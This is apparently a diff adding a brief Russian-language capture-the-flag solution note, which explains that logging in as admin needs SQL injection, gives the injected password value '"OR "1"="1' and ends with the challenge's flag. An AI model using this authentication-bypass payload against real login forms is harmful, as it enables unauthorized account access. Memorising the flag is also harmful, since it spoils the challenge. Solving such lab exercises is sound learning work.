@@ -1,0 +1,7 @@
+суть задания что бы залогинится под админом, тут понадобится sql inject
+
+вводим 
+login: admin
+password: "OR "1"="1
+
+flag{w0w_y0u_know_it"?}
